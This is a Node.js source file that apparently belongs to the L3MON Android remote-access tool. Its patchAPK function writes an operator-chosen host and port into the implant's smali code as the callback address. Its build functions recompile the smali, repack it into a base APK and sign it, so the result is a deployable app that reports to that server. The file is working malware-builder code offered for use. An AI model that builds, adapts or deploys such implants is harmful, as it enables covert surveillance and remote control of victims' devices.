const
    cp = require('child_process'),
    fs = require('fs'),
    path = require('path'),
    CONST = require('./const');

function javaversion(callback) {
    let spawn = cp.spawn('java', ['-version']);
    let output = '';
    spawn.on('error', (err) => callback('Java not found. Please install Java. Error: ' + err, null));
    spawn.stderr.on('data', (data) => { output += data.toString(); });
    spawn.stdout.on('data', (data) => { output += data.toString(); });
    spawn.on('close', (code) => {
        if (output.length > 0) return callback(null, output.split('\n')[0].trim());
        else return callback('Java not found or not responding', null);
    });
}

function patchAPK(URI, PORT, cb) {
    if (PORT < 65535) {
        fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
            if (err) return cb('File Patch Error - READ');
            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + URI + ":" + PORT);
            fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
                if (err) return cb('File Patch Error - WRITE');
                else return cb(false);
            });
        });
    }
}

// ── Termux-specific build: smali→dex via bundled smali, patch into base_patched.apk ──
// Avoids apktool's bundled aapt2 ELF binary which crashes on Android ARM (exit 2, ELF not found)
function buildAPKTermux(cb) {
    const smaliDir = path.join(CONST.smaliPath, 'smali');
    const baseApk = CONST.baseApkPatched;
    const dexTmp = path.join(require('os').tmpdir(), 'l3mon_classes.dex');
    const buildApk = CONST.apkBuildPath;

    // Step 1: smali dir → classes.dex using org.jf.smali.Main bundled inside apktool.jar
    const smaliCmd = `java -cp "${CONST.apkTool}" org.jf.smali.Main assemble "${smaliDir}" -o "${dexTmp}"`;
    cp.exec(smaliCmd, (err, stdout, stderr) => {
        if (err) return cb('Smali compile failed: ' + (stderr || err.message));

        // Step 2: copy base_patched.apk → build.apk
        fs.copyFile(baseApk, buildApk, (err) => {
            if (err) return cb('Failed to copy base APK: ' + err.message);

            // Step 3: update classes.dex inside the APK copy using zip
            // zip -j updates/adds the file in-place inside the archive
            const zipCmd = `zip -j "${buildApk}" "${dexTmp}"`;
            cp.exec(zipCmd, (err) => {
                if (err) return cb('Failed to patch dex into APK: ' + err.message);

                // cleanup temp dex
                fs.unlink(dexTmp, () => { });
                cb(false);
            });
        });
    });
}

function buildAPK(cb) {
    javaversion(function (err) {
        if (err) return cb(err);

        if (CONST.platform.isTermux) {
            // Termux: smali+zip path (no aapt2 required)
            buildAPKTermux((err) => {
                if (err) return cb('Build Failed - ' + err);
                cp.exec(CONST.signCommand, (error) => {
                    if (!error) return cb(false);
                    else return cb('Sign Command Failed - ' + error.message);
                });
            });
        } else {
            // Desktop: normal apktool path
            cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
                if (error) return cb('Build Command Failed - ' + error.message);
                cp.exec(CONST.signCommand, (error) => {
                    if (!error) return cb(false);
                    else return cb('Sign Command Failed - ' + error.message);
                });
            });
        }
    });
}

module.exports = { buildAPK, patchAPK }
